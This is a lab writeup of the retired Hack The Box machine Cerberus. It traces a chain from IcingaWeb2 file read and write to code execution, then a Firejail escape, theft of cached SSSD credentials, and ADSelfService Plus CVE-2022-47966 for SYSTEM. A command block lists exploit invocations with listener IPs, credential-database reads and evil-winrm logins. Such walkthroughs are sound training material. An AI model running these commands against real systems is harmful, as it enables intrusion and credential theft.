---
machine: Cerberus
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, icinga, firejail, sssd, adselfservice]
---

# Cerberus — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

IcingaWeb2 on a Linux VM is vulnerable to file read and write (CVE-2022-24716 and CVE-2022-24715). A fake module gives execution; Firejail CVE-2022-31214 escapes, SSSD credentials open WinRM and ADSelfService Plus CVE-2022-47966 yields SYSTEM.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80,443,5665,8080 <IP>
curl -s http://cerberus.htb/icingaweb2/
# CVE-2022-24716 read and CVE-2022-24715 write
python3 icinga_exploit.py http://cerberus.htb/icingaweb2 <IP> 4444
# Firejail
firejail --version
firejail --join=<PID>
# SSSD
getent passwd
ls -la /var/lib/sss/db/
# WinRM and ADSelfService
evil-winrm -i <HOST> -u <USER> -p '<PASS>'
python3 CVE-2022-47966.py --url https://<HOST> --lhost <IP>
```

## Enumeration

- Exposed IcingaWeb2 with modules and templates.
- Vulnerable Firejail inside the VM.
- SSSD with cached credentials and WinRM on the Windows host.

## Initial access

Use IcingaWeb2 arbitrary file read to read configuration and file write to plant a malicious PHP module. Loading it executes code as the web service user.

## Privilege escalation

Exploit Firejail to join the root namespace inside the VM and extract credentials from the SSSD database. Use them over WinRM; ADSelfService Plus is vulnerable to CVE-2022-47966 and executes as SYSTEM.

## Evidence

- Icinga configuration read.
- Malicious module loaded and VM shell.
- SSSD credentials, WinRM and SYSTEM shell.

## Lessons learned

- A monitoring panel with file write is RCE.
- Firejail and SSSD widen lateral movement.
- A product with weak SAML validation can cost the domain.

## Mitigation and detection

- Update IcingaWeb2, Firejail and ADSelfService Plus.
- Restrict modules and writes in the web root.
- Limit WinRM and protect the SSSD cache.

## References

- [0xdf — Cerberus](https://0xdf.gitlab.io/2023/07/29/htb-cerberus.html)
- [NVD — CVE-2022-24715](https://nvd.nist.gov/vuln/detail/CVE-2022-24715)
- [Hack The Box — Cerberus](https://app.hackthebox.com/machines/cerberus)
